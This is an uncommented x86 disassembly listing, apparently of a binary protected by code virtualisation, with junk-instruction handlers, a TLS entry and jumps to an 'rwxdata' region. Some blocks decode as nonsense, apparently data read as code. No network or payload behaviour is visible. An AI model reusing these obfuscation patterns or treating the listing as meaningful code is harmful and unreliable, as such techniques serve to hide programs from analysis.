add ebp 0x6
call j_sub_1020e9de
mov ax bx
mov edx [ ebp ]
cwde
setbe al
mov eax [ ebp + 0x4 ]
pushfd
push 0xcac57914
div [ ebp + 0x8 ]
call sub_1020d5f9
pushfd
pushad
mov [ esp + 0x8 ] cl
mov [ esp + 0x10 ] 0x4f
pushfd
pop [ esp + 0x20 ]
mov [ esp ] si
pushfd
push ecx
mov [ esp + 0x4 ] 0xfc
push [ esp + 0x28 ]
pop [ ebp ]
push edi
lea esp [ esp + 0x30 ]
jmp sub_1020f090
sub_1020f0e7
add al bl
movsx dx cl
push 0x79f3b0be
inc al
dec dx
jmp rwxdata
jmp rwxdata
not al
jmp rwxdata
dec esi
shr dh cl
inc dh
add al 0xc1
not dl
dec dl
add bl al
rcl dh 0x1
shl dh cl
mov dx [ ebp ]
clc
add ebp 0x2
pushad
mov [ eax + edi ] dl
pushfd
mov [ esp ] 0x5b
push ebx
lea esp [ esp + 0x30 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020f1f0
push [ esp ]
mov [ ebp ] eax
mov [ esp ] 0x25
lea esp [ esp + 0x2c ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020f235
call j_sub_1020e6b8
add [ ebp + 0x4 ] eax
pushfd
pushfd
pop [ esp ]
pushfd
push [ esp + 0x4 ]
pop [ ebp ]
pushfd
push [ esp ]
lea esp [ esp + 0x10 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020f266
pushfd
[ edi ] [ esi ]
bswap si
rol esi cl
neg di
cld
mov edi [ esp + 0x48 ]
pop esi
shl si cl
std
pop esi
mov esi [ esp + 0x44 ]
stc
mov [ esp ] 0xc
call sub_1020e2ed
mov [ ebp + 0x4 ] eax
pushfd
push [ esp ]
jmp rwxdata
mov [ esp ] cl
pushfd
pop [ esp + 0x2c ]
call sub_1020d2c8
shl cl 0x5
lahf
not ax
mov eax [ ebp ]
shl dl cl
xor cl ch
xor dl cl
mov edx [ ebp + 0x4 ]
shl cl cl
shl cl cl
test ch bl
or cl ch
mov cl [ ebp + 0x8 ]
stc
jmp rwxdata
jmp rwxdata
stc
add ebp 0x2
bt sp 0xd
shrd eax edx cl
push 0xf51dd510
call sub_1020e516
bt di cx
push edx
mov al [ eax + edi ]
stc
cmc
cmc
mov [ esp ] ax
sub ebp 0x2
pushfd
push [ esp ]
push [ esp ]
call sub_1020ef6e
inc al
stc
clc
call sub_1020e952
mov [ ebp ] ax
push edx
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp sub_1020f090
sub_1020f2d0
call sub_1020ea0c
bts dx 0x5
sub bl al
call sub_1020e591
push 0xbedda183
mov [ ebp ] eax
mov [ esp + 0xc ] 0x21
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020f2fd
bt bp cx
mov dx [ ebp + 0x2 ]
cmc
pushfd
not al
cmp bl 0x9e
pushfd
cmp sp 0x89f9
not dl
pushfd
sub ebp 0x2
push [ esp + 0x4 ]
mov [ esp + 0x8 ] bh
jmp rwxdata
call sub_1020d263
shrd ax di cl
dec eax
mov eax [ ebp ]
cmp ah 0xba
clc
cmc
jmp sub_1020e400
sub_1020f359
pushfd
pop [ esp + 0x48 ]
call sub_1020f2d0
mov [ es : eax ] edx
push [ esp ]
lea esp [ esp + 0x2c ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_10115558
lea edi [ edi + 0x1 ]
pop eax
mov eax [ esp + 0x18 ]
pushfd
jmp sub_1020c638
j_sub_10117643
jmp sub_10117643
sub_10115a39
cmp al [ edi ]
call sub_10115558
sub_10115b2d
call sub_10148947
sub_10115c87
inc esi
pushfd
adc dl dl
lea esp [ esp + 0x42 ]
push edx
mov [ esp ] 0x73a6
push [ esp + 0x4 ]
retn 0x8
sub_1011606c
add bh 0xac
add esi 0x8
not bh
rol bx cl
shl bh 0x1
shld bx si 0x8
mov bx [ esi ]
mov [ esp + 0x8 ] 0xd54a6ebc
cmc
test ah bh
jmp sub_102018d5
sub_10116165
sub al 0x30
jmp sub_101441b3
sub_101164b1
call sub_102096ea
mov [ esp + 0x3c ] rwxdata
mov [ esp + 0x4 ] 0x60fabe0b
mov [ esp + 0x14 ] 0xfe
pushfd
pushfd
push [ eax ]
pop [ esp + 0x40 ]
pushfd
push [ esp + 0x44 ]
retn 0x48
sub_10116a9b
lea esp [ esp + 0x8 ]
jne rwxdata
stc
call sub_101491f0
jmp rwxdata
jmp rwxdata
pushad
stosb [ edi ]
pushad
lea esp [ esp + 0x40 ]
jmp sub_101446f5
j_sub_10144651
jmp sub_10144651
sub_10116de4
cmc
mov [ ebp - 0x10 ] ecx
push 0x240797d6
shl cx cl
bswap cx
mov ecx [ ebp + 0xc ]
call j_sub_1020c757
sub_10117643
pushfd
mov esp ebp
jmp rwxdata
mov bp 0x2e3c
pop ebp
push 0xcf5f1a03
push [ esp + 0x4 ]
retn 0x18
sub_101189ce
not al
lea edi [ edi + 0x1 ]
not al
jmp sub_10145fa9
sub_1011dfc7
call sub_101162d3
sub_1011dfcc
mov esi [ ebp + 0xc ]
lea esp [ esp + 0x48 ]
call sub_101153b8
sub_1011dfd8
cmp ebx 0x3
mov [ esp + 0x4 ] 0xba
call sub_101446bd
sub_1011e8f2
call sub_1020a695
j_sub_10208e7c
jmp sub_10208e7c
j_sub_1014b61b
jmp sub_1014b61b
sub_1011eb7e
bt cx ax
cmp eax [ ebp - 0x10 ]
jmp sub_10118383
j_sub_1011701f
stc
jmp sub_1011701f
sub_1011f091
sub esi eax
call j_sub_10145808
sub_101441ac
mov esi edi
jmp sub_1011f091
sub_101441b3
cmc
cmp al 0x9
jmp sub_1020948c
sub_10144293
mov [ esp + 0x4 ] ah
mov [ esp + 0x4 ] 0xe8
mov [ esp + 0x4 ] 0x27cbcaa9
mov [ esp ] 0x5e
pushad
mov [ esp + 0x20 ] 0x860925ad
pushfd
push edi
mov [ esp ] bx
mov [ esp + 0x10 ] 0x84
lea esp [ esp + 0x28 ]
jmp sub_1020e898
sub_101443c1
stc
add si 0x4c41
sub ecx ebx
clc
rcr si 0x1
lea esi [ esp + 0x4 ]
cmp cl al
pushad
sub edi 0x4
call sub_101151da
sub_101444e1
add ah 0x20
push esp
cmc
mov [ esp ] 0xd5ce
test dl bl
or al al
call sub_102000c8
movsx si al
mov esi [ ebp + 0xc ]
jmp sub_10201df6
sub_10144671
push 0xd0c250c2
mov edi [ edi + ecx * 4 ]
push ecx
mov [ esp + 0x8 ] cx
call sub_10116e45
j_sub_102057d4
jmp sub_102057d4
sub_101446ea
push 0xd49d9a71
mov bl 0x2
lea esp [ esp + 0xc ]
sub_101446f5
pushfd
pushad
call sub_10205076
j_sub_1014c654
jmp sub_1014c654
sub_10144c23
pushfd
pushfd
setb bl
mov esi [ esp + 0x2c ]
movzx bx al
not bl
mov ebx [ esp + 0x30 ]
push 0xde891f7
call j_sub_102055af
sub_10144e7a
btc ax 0x3
clc
jmp sub_101189da
j_sub_101162e2
jmp sub_101162e2
j_sub_1020799d
jmp sub_1020799d
sub_101468c8
cmp ebx 0x3
call sub_1011e0f2
sub_1014720b
push 0xb84f5d36
call sub_10208269
sub_10147227
cmp bl 0x8c
xor ecx ecx
lea esp [ esp + 0x4 ]
sub_1014723b
bt ax 0x4
xchg [ esp + 0x28 ] esi
mov [ esp ] 0x815f
movzx si al
rcl si cl
jmp sub_101441ac
sub_10148947
call sub_10206a8d
pushfd
pushad
pushfd
mov [ esp + 0x24 ] 0x3599ca98
call j_sub_1020009d
pop esp
hlt
sub_10148ad9
mov [ esp ] bh
mov [ esp ] 0x3d
mov [ esp ] 0xe33cb1e9
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jmp sub_1020d404
sub_10149223
call sub_1014c83c
scasd [ edi ]
out 0xb9 al
out 0xd9 al
retn 0x12bd
sub_10149924
add [ ebp - 0x4 ] ecx
xadd di bx
shl bh cl
bt sp sp
sub ecx 0x8
setb bl
stc
call sub_10204d3b
sub_1014993d
mov [ esp ] 0x7147
call sub_10203389
push esp
call sub_1011e5a4
jl rwxdata
sbb dl bl
mov eax 0xca55b202
mov edx 0x8510cf90
or ebp edx
jmp sub_10149924
mov dl 0x60
sub_1014a52c
cmp ecx [ ebp - 0x8 ]
jmp sub_1014ae6c
sub_1014ac34
btc edi 0x1d
adc edx 0xa412df6c
sub eax eax
xchg edx edi
jmp sub_10204d05
sub_1014b634
mov [ esp + 0xc ] rwxdata
mov [ esp ] 0x6dbb43c9
jmp rwxdata
push 0xb3ff8f76
push [ esp + 0x4 ]
mov [ esp + 0x10 ] eax
pushad
push [ esp + 0x30 ]
retn 0x34
j_sub_101fff69
jmp sub_101fff69
j_sub_1020ae98#2
jmp j_sub_1020ae98
sub_1014c566
pushad
mov [ esp + 0x20 ] rwxdata
pushad
mov [ esp + 0x3c ] eax
mov [ esp + 0x4 ] dl
pushfd
push [ esp + 0x1c ]
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_1014c654
call sub_10204cc4
and esp ebp
pop ecx
adc eax 0xa6522c0a
into
std
inc edx
push es
sub_101599d3
not al
call sub_1014799f
xchg [ eax - 0x3b ] eax
stc
dec esi
xor [ edx + 0x1b ] eax
mov [ 0xffffffffaab9b2f3 ] eax
sahf
pop es
push edi
cmp [ edi - 0x441b6879 ] al
iretd
j_sub_102055af
jmp sub_102055af
sub_101fcf05
pushfd
call sub_1020afca
sub_101ff898
call sub_1014a52c
ror [ ebx ] cl
aam 0xc1
popfd
inc eax
pop esi
lahf
xchg ebx eax
inc eax
iretd
sub_1020009d
pushfd
mov [ esp + 0x28 ] 0x7790afa5
push ecx
push esi
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
push 0x91552ce4
push [ esp ]
mov [ esp + 0x4 ] edx
lea esp [ esp + 0x4 ]
sub_102000c8
pushfd
call sub_10116e13
mov esi 0xe688f760
cmp [ ebp + 0x666df688 ] ecx
pop ecx
push edi
int1
cmpsb [ esi ] [ edi ]
stc
adc ebp ebp
add [ 0x6df285f9 ] edi
jmp 0xffffffff90914e61
sub_10201207
call sub_102074aa
j_sub_1020c757
jmp sub_1020c757
sub_10201415
adc ecx ecx
mov [ esp ] 0x3f
push [ esp ]
call sub_1014681d
j_sub_1014b104
jmp sub_1014b104
sub_10201df6
call sub_10207ea9
j_sub_1020b448
jmp sub_1020b448
j_sub_1020ae98
jmp sub_1020ae98
j_sub_1011ee26
jmp sub_1011ee26
j_sub_10116a9b
jmp sub_10116a9b
sub_102052d9
bswap esi
mov esi [ esp + 0x34 ]
push 0xb2875d0f
mov [ esp ] 0xcaa8
mov [ esp ] 0xff
lea esp [ esp + 0x3c ]
jmp sub_101446f5
sub_1020546b
cmp ah 0x2e
pushfd
pushfd
push [ esp + 0x4c ]
retn 0x50
sub_102055af
mov [ esp ] al
mov esp ebp
pushfd
mov ebp [ esp + 0x4 ]
push 0x289511d7
pushad
push [ esp + 0x2c ]
retn 0x34
sub_102055d2
call sub_10204016
sub_102055eb
push 0x358f76af
push [ esp + 0xc ]
retn 0x10
sub_102057ce
pushfd
jmp rwxdata
mov [ esp + 0x3c ] rwxdata
mov [ esp + 0x4 ] 0x60fabe0b
mov [ esp + 0x14 ] 0xfe
pushfd
pushfd
push [ eax ]
pop [ esp + 0x40 ]
pushfd
push [ esp + 0x44 ]
retn 0x48
sub_102060ba
jmp rwxdata
cmp ebx 0x2
jmp j_sub_1020799d
sub_102061e6
not al
mov al 0x10
jmp sub_1020ac2a
j_sub_10201dfb
jmp sub_10201dfb
sub_10206e09
push ecx
cmp cl 0xf7
cmc
add dl dl
push [ esp + 0x4 ]
call sub_10209cf7
sub_1020798c
mov esi [ esp + 0x10 ]
mov [ esp + 0x8 ] ebx
lea esp [ esp + 0x14 ]
jmp sub_101446f5
sub_10207a6d
call sub_10204984
j_sub_102052d9
jmp sub_102052d9
j_sub_1020c42d
jmp sub_1020c42d
sub_10208e7c
mov [ esp ] eax
pushad
lodsb [ esi ]
cmc
clc
clc
cmc
xor al 0x72
cmc
bt di bp
call sub_10202fa5
sub_10208e91
lea esp [ esp + 0x4 ]
jae rwxdata
call sub_101ff649
call sub_10204b40
pushfd
[ edi ] [ esi ]
call sub_1020798c
fimul [ edx ]
adc al 0x12
insb
retn
sub_102091f3
mov [ esp + 0x44 ] rwxdata
push 0x52a2428b
jmp rwxdata
jmp rwxdata
mov [ esp + 0x4 ] al
push [ eax ]
pop [ esp + 0x44 ]
pushfd
pushfd
pushfd
push [ esp + 0x50 ]
retn 0x54
j_sub_1014723b
jmp sub_1014723b
sub_10209cf2
call sub_1011745f
j_sub_10145808
jmp sub_10145808
sub_1020ac39
jmp rwxdata
sets bl
stosb [ edi ]
not bl
jmp sub_101446ea
j_sub_1020009d
jmp sub_1020009d
sub_1020afca
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x83
mov [ esp + 0x4 ] 0x7e
push [ esp + 0x8 ]
retn 0xc
sub_1020b434
mov [ esp + 0x28 ] eax
push edi
mov [ esp ] 0x7b
push [ esp + 0x8 ]
push [ esp + 0x30 ]
retn 0x34
sub_1020b448
pop ebx
mov cx 0x533b
pop ebx
push 0xa9aae45d
mov ecx [ esp + 0x4 ]
call j_sub_10117643
mov cl 0x2f
iretd
sub_1020b79e
mov [ esp ] 0x516
push [ esp + 0x30 ]
popf
push 0x40c349ae
call sub_1011ebf1
_TLS_Entry_0
jmp sub_1020bb91
sub_1020c441
mov [ esp ] ebp
sub eax eax
push [ esp ]
mov [ esp + 0x4 ] al
push ebx
lea esp [ esp + 0xc ]
call sub_101ffc63
call sub_1020a4fe
inc esp
lea esi [ edx + 0xe30be80 ]
sub_1020d3bd
push [ esp + 0x3c ]
pop [ ebp ]
push 0x9b7a1902
mov [ esp + 0xc ] 0x9
mov [ esp + 0x8 ] 0x2d4a
push 0x8778e362
lea esp [ esp + 0x48 ]
jmp sub_1020f090
sub_1020d404
push ecx
jmp rwxdata
pushfd
mov [ esp + 0x4 ] edx
pushfd
push 0x69211d4e
lea esp [ esp + 0xc ]
jmp sub_1020d32f
sub_1020d434
cmp di 0x2047
sub ebp 0x2
pushfd
pushfd
pushfd
pushfd
mov [ ebp ] ax
mov [ esp + 0x14 ] edi
lea esp [ esp + 0x3c ]
jmp sub_1020f090
sub_1020d49b
push 0x8df4db9e
mov [ esp + 0x4 ] bx
mov [ esp + 0x4 ] edx
push 0xe6df80e7
push [ esp + 0x4 ]
pushad
pushfd
push [ esp + 0x30 ]
retn 0x34
sub_1020d5f9
mov [ ebp + 0x4 ] edx
mov [ esp ] 0x9ed5
mov [ ebp + 0x8 ] eax
call sub_1020e55c
j_sub_1020e9de
jmp sub_1020e9de
sub_1020d6c0
push [ esp + 0x2c ]
pop [ ebp ]
mov [ esp ] 0x712
pushfd
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020d6d7
pushfd
pop [ esp + 0x38 ]
jmp sub_1020efa8
sub_1020d705
mov ebx [ esp + 0x4 ]
push esi
pushad
mov [ esp ] edx
lea esp [ esp + 0x2c ]
jmp sub_1020f090
sub_1020d738
push [ esp + 0x30 ]
pop [ ebp ]
mov [ esp + 0x4 ] 0xc359220
mov [ esp ] 0x20d6
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020d7db
cwde
cmc
sub ebp 0x4
jmp j_sub_1020d9aa
sub_1020d877
push [ esp + 0x54 ]
pop [ ebp ]
mov [ esp + 0x4 ] esi
mov [ esp ] 0x9bcd
lea esp [ esp + 0x58 ]
jmp sub_1020f090
sub_1020d891
mov [ esp + 0x4 ] di
inc edx
pushfd
pushfd
dec [ ebp ]
push 0xfcff6c51
pushad
call sub_1020d591
sub_1020d952
pushad
pushfd
pop [ esp + 0x28 ]
call sub_1020db2d
cld
push 0x2d3807c7
push ebp
jmp sub_1020f266
sub_1020d99b
pushfd
pop [ esp + 0x8 ]
jmp sub_1020f296
j_sub_1020d9aa
jmp sub_1020d9aa
sub_1020d9aa
push esi
mov [ ebp ] eax
mov [ esp ] bl
lea esp [ esp + 0x3c ]
jmp sub_1020f090
sub_1020da1d
shl eax cl
jmp sub_1020da79
sub_1020da3f
push [ esp ]
test ecx edx
call sub_1020d7db
pushad
mov [ ebp ] ax
pushfd
push edi
pushfd
lea esp [ esp + 0x2c ]
jmp sub_1020f090
sub_1020da5a
mov [ esp + 0x20 ] ebx
movsx ax al
mov eax [ ebp ]
mov [ esp + 0xc ] bh
mov [ esp ] 0x1d54
call sub_1020d641
jmp sub_1020ee77
sub_1020da79
mov [ esp + 0x10 ] esi
jmp sub_1020dcbd
sub_1020dabb
push [ esp + 0x40 ]
pop [ ebp ]
push [ esp + 0x4 ]
lea esp [ esp + 0x48 ]
jmp sub_1020f090
sub_1020daef
pushfd
mov [ esp + 0xc ] edx
pushad
mov [ esp + 0x10 ] 0x6d5002e3
pushfd
push [ esp + 0x30 ]
retn 0x34
sub_1020db2d
mov [ esp + 0x4 ] 0x4f6f
jmp sub_1020d6c0
sub_1020db72
mov [ ebp + 0x8 ] eax
call sub_1020d397
sub_1020db7a
call sub_1020d6d7
sub_1020dbe4
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp sub_1020eedd
sub_1020e2b4
stc
add al 0xc1
clc
cmp dh dh
stc
add bl al
jmp sub_1020f33b
sub_1020e3f4
call sub_1020d91d
imul edx
jmp sub_1020e3b1
sub_1020e464
mov [ ebp ] ax
pushfd
lea esp [ esp + 0x4c ]
jmp sub_1020f090
sub_1020e648
pushad
mul dx
call sub_1020f235
call sub_1020e2b4
sub_1020e656
cbw
call sub_1020da3f
movsx dx al
mov ax [ ebp ]
jmp sub_1020f2fd
sub_1020e684
add ebp 0x4
jmp sub_1020f1ca
sub_1020e82b
push [ esp + 0x24 ]
pop [ ebp ]
pushfd
pushfd
pushfd
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020e952
stc
xor al 0x3d
call sub_1020ecb5
sub_1020e95a
push ecx
mov [ ebp ] edx
call sub_1020dcf8
pushad
call sub_1020da5a
j_sub_1020daef
jmp sub_1020daef
sub_1020e9a0
sub ebp 0x4
jmp sub_1020e648
sub_1020e9b5
rol bp 0xa
mov [ esp ] esi
seto dh
stc
jmp sub_1020e6ca
sub_1020e9c5
pushfd
mov [ esp + 0x4 ] edx
push 0x7a01be57
pushad
mov [ esp ] 0x6b
pushfd
lea esp [ esp + 0x2c ]
jmp sub_1020d32f
sub_1020ea0c
call sub_1020d877
cmc
sub ebp 0x2
bt bp 0x3
push 0x667f09fc
shr eax cl
mov [ esp ] 0x4dd2
mov [ esp ] bl
push 0xc73fd950
mov [ ebp + 0x4 ] eax
jmp sub_1020d99b
j_sub_1020d738
jmp sub_1020d738
sub_1020ec77
pushfd
mov [ esp ] edx
pushfd
pushad
lea esp [ esp + 0x24 ]
jmp sub_1020d32f
sub_1020ecb5
mov [ esp + 0x1c ] 0x9f
not al
stc
cmp si bx
add bl al
stc
test al cl
mov [ esp ] 0x64
call sub_1020e656
jmp sub_1020ec77
sub_1020edb5
pushfd
pushfd
pop [ esp + 0x2c ]
call j_sub_1020d738
mov [ ebp + 0x4 ] ax
jmp rwxdata
mov [ esp + 0x10 ] 0xbf
push 0x6b961e18
jmp sub_1020f359
sub_1020eddd
mov [ ebp + 0x4 ] edx
pushfd
jmp rwxdata
call sub_1020db72
sub_1020eeb6
mov [ esp ] edx
pushad
lea esp [ esp + 0x20 ]
jmp sub_1020d32f
sub_1020eedd
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp sub_1020ef69
sub_1020ef69
call sub_1020e861
sub_1020ef6e
mov [ ebp ] ax
pushad
push esi
mov [ esp + 0xc ] dh
pushfd
lea esp [ esp + 0x3c ]
jmp sub_1020f090
sub_1020efa8
push [ esp + 0x38 ]
pop [ ebp ]
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0x44 ]
jmp sub_1020f090
sub_1020f02e
cmp cl 0x76
xor al [ edx ]
push edi
jmp rwxdata
jmp sub_1020d891
sub_1020f090
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp sub_1020e8e6
sub_1020f1ca
mov [ esp ] 0x98
push [ esp ]
mov [ esp + 0x4 ] ch
mov [ esp + 0x4 ] rwxdata
mov [ esp ] al
mov [ esp ] edx
push esp
push [ esp ]
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
sub_1020f296
push 0x6d6bf94a
jmp rwxdata
push [ esp + 0xc ]
pop [ ebp ]
mov [ esp + 0x8 ] al
mov [ esp ] bl
pushad
push [ esp + 0x4 ]
lea esp [ esp + 0x34 ]
jmp sub_1020f090
sub_1020f33b
mov al [ eax + edi ]
cmp dl dh
cmc
sub ebp 0x2
pushfd
pushfd
mov [ ebp ] ax
pushfd
lea esp [ esp + 0x38 ]
jmp sub_1020f090
j_sub_1020e6b8
jmp sub_1020e6b8
